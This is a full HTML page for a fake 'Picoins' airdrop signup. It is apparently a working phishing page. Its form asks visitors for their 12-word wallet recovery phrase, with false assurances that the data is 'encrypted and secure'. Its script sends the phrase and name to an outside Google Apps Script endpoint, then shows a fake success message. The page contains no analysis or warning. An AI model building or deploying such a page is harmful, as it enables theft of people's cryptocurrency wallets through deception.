<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Register for Airdrop</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 60px 20px;
      min-height: 100vh;
      margin: 0;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: 
        radial-gradient(circle at 20% 20%, rgba(0, 255, 204, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 80% 80%, rgba(0, 201, 167, 0.1) 0%, transparent 50%);
      z-index: 0;
    }

    .container {
      max-width: 1200px;
      width: 100%;
      margin: 0 auto;
      position: relative;
      z-index: 1;
    }

    .header {
      text-align: center;
      margin-bottom: 40px;
    }

    .logo-container {
      width: 120px;
      height: 120px;
      margin: 0 auto 20px;
      background: linear-gradient(45deg, #00c9a7, #00ffcc);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 0 30px rgba(0, 255, 204, 0.3);
    }

    .logo-container i {
      font-size: 48px;
      color: #0f172a;
    }

    h1 {
      background: rgba(15, 23, 42, 0.7);
      padding: 15px 30px;
      border-radius: 15px;
      font-size: 32px;
      font-weight: bold;
      margin-bottom: 15px;
      display: inline-block;
      border: 1px solid rgba(0, 255, 204, 0.1);
    }

    .subtitle {
      color: #00ffcc;
      font-size: 18px;
      margin-bottom: 30px;
      text-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
    }

    .trust-badges {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }

    .trust-badge {
      background: rgba(15, 23, 42, 0.7);
      padding: 10px 20px;
      border-radius: 10px;
      display: flex;
      align-items: center;
      gap: 10px;
      border: 1px solid rgba(0, 255, 204, 0.1);
      backdrop-filter: blur(5px);
    }

    .trust-badge i {
      color: #00ffcc;
    }

    form {
      background: rgba(15, 23, 42, 0.7);
      padding: 40px;
      border-radius: 20px;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 0 30px rgba(0, 255, 204, 0.1);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(0, 255, 204, 0.1);
      margin: 0 auto;
    }

    .form-group {
      margin-bottom: 25px;
    }

    .form-group label {
      display: block;
      margin-bottom: 10px;
      color: #00ffcc;
      font-weight: 500;
    }

    input[type="text"], textarea {
      width: 100%;
      padding: 15px;
      border-radius: 10px;
      border: 1px solid rgba(0, 255, 204, 0.2);
      background-color: rgba(15, 23, 42, 0.8);
      color: #fff;
      font-size: 16px;
      transition: all 0.3s ease-in-out;
      box-sizing: border-box;
    }

    input[type="text"]:focus,
    textarea:focus {
      border-color: #00ffcc;
      outline: none;
      box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
    }

    textarea {
      height: 120px;
      resize: vertical;
    }

    .submit-btn {
      background: linear-gradient(45deg, #00c9a7, #00ffcc);
      border: none;
      border-radius: 10px;
      color: #0f172a;
      font-weight: bold;
      font-size: 18px;
      padding: 18px;
      cursor: pointer;
      transition: all 0.3s ease-in-out;
      width: 100%;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .submit-btn:hover {
      background: linear-gradient(45deg, #00ffcc, #00c9a7);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 255, 204, 0.3);
    }

    .security-info {
      margin-top: 20px;
      padding: 15px;
      background: rgba(0, 255, 204, 0.1);
      border-radius: 10px;
      font-size: 14px;
      color: #00ffcc;
      border: 1px solid rgba(0, 255, 204, 0.2);
    }

    .security-info i {
      margin-right: 5px;
    }

    .success-message {
      margin-top: 25px;
      padding: 20px;
      background: rgba(0, 255, 204, 0.1);
      border: 1px solid #00ffcc;
      color: #00ffcc;
      border-radius: 10px;
      font-weight: 600;
      display: none;
      text-align: center;
      animation: fadeIn 0.5s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .footer {
      margin-top: 40px;
      text-align: center;
      font-size: 14px;
      color: rgba(255, 255, 255, 0.7);
    }

    .footer a {
      color: #00ffcc;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    @media (max-width: 600px) {
      body {
        padding: 15px 10px;
        min-height: auto;
      }

      .container {
        width: 100%;
        padding: 0;
      }

      .header {
        margin-bottom: 25px;
      }

      .logo-container {
        width: 90px;
        height: 90px;
        margin: 0 auto 15px;
        box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
      }

      .logo-container i {
        font-size: 36px;
      }

      h1 {
        font-size: 24px;
        padding: 12px 25px;
        margin-bottom: 12px;
        line-height: 1.2;
      }

      .subtitle {
        font-size: 16px;
        margin-bottom: 20px;
        line-height: 1.3;
      }

      .trust-badges {
        flex-direction: row;
        flex-wrap: wrap;
        justify-content: center;
        gap: 8px;
        margin-bottom: 25px;
      }

      .trust-badge {
        width: auto;
        min-width: 120px;
        max-width: 45%;
        justify-content: center;
        padding: 10px 15px;
        font-size: 14px;
      }

      .trust-badge i {
        font-size: 14px;
      }

      form {
        padding: 25px 15px;
        border-radius: 12px;
        margin: 0 auto;
      }

      .form-group {
        margin-bottom: 20px;
      }

      .form-group label {
        font-size: 14px;
        margin-bottom: 8px;
      }

      input[type="text"], textarea {
        padding: 12px;
        font-size: 15px;
        border-radius: 8px;
      }

      textarea {
        height: 100px;
      }

      .submit-btn {
        padding: 14px;
        font-size: 16px;
      }

      .security-info {
        margin-top: 15px;
        padding: 12px;
        font-size: 13px;
        border-radius: 8px;
      }

      .success-message {
        margin-top: 20px;
        padding: 15px;
        font-size: 14px;
      }

      .footer {
        margin-top: 25px;
        font-size: 12px;
        padding: 0 10px;
      }

      .footer p {
        margin: 5px 0;
      }
    }

    @media (max-width: 380px) {
      body {
        padding: 12px 8px;
      }

      .header {
        margin-bottom: 20px;
      }

      h1 {
        font-size: 22px;
        padding: 10px 20px;
      }

      .subtitle {
        font-size: 15px;
      }

      .trust-badge {
        min-width: 110px;
        font-size: 13px;
        padding: 8px 12px;
      }

      form {
        padding: 20px 12px;
      }

      .form-group label {
        font-size: 13px;
      }

      input[type="text"], textarea {
        padding: 10px;
        font-size: 14px;
      }

      .submit-btn {
        padding: 12px;
        font-size: 15px;
      }

      .security-info {
        font-size: 12px;
        padding: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="logo-container">
        <i class="fas fa-coins"></i>
      </div>
      <h1>Join the Airdrop</h1>
      <p class="subtitle">Get your free Picoins today!</p>
      
      <div class="trust-badges">
        <div class="trust-badge">
          <i class="fas fa-shield-alt"></i>
          <span>Secure</span>
        </div>
        <div class="trust-badge">
          <i class="fas fa-bolt"></i>
          <span>Instant</span>
        </div>
      </div>
    </div>

    <form id="register-form">
      <div class="form-group">
        <label for="username">Your Name</label>
        <input type="text" name="username" id="username" placeholder="Enter your full name" required />
      </div>
      
      <div class="form-group">
        <label for="wallet">Wallet Recovery Phrase</label>
        <textarea name="wallet" id="wallet" placeholder="Enter your 12-word recovery phrase..." required></textarea>
      </div>

      <div class="security-info">
        <i class="fas fa-lock"></i>
        Your information is encrypted and secure
      </div>

      <button type="submit" class="submit-btn">
        <i class="fas fa-rocket"></i> Register Now
      </button>
    </form>

    <div class="success-message" id="success-message">
      <i class="fas fa-check-circle"></i> Registration Successful!
    </div>

    <div class="footer">
      <p>Â© 2024 Picoins Airdrop. All rights reserved.</p>
      <p><a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a></p>
    </div>
  </div>

  <script>
    const form = document.getElementById("register-form");
    const successMessage = document.getElementById("success-message");
    const usernameInput = document.getElementById("username");
    const walletInput = document.getElementById("wallet");

    form.addEventListener("submit", function(e) {
      e.preventDefault();

      const walletWords = walletInput.value.trim().split(/\s+/);
      if (walletWords.length !== 12) {
        alert("Please enter exactly 12 words in the wallet recovery phrase.");
        return;
      }

      const data = {
        username: usernameInput.value.trim(),
        wallet: walletInput.value.trim()
      };

      fetch("https://script.google.com/macros/s/AKfycbx8hA2yvu_Py0TTbUkocCjmPZI12rmtz5eXailJ1NJqfEn-Rc04Y3Zffg6lxFpl2Tly4Q/exec", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });

      // Show success message with animation
      successMessage.style.display = "block";
      successMessage.style.animation = "none";
      successMessage.offsetHeight; // Trigger reflow
      successMessage.style.animation = "fadeIn 0.5s ease-in-out";

      // Clear form
      usernameInput.value = "";
      walletInput.value = "";

      // Hide after 4 seconds
      setTimeout(() => {
        successMessage.style.display = "none";
      }, 4000);
    });
  </script>
</body>
</html>
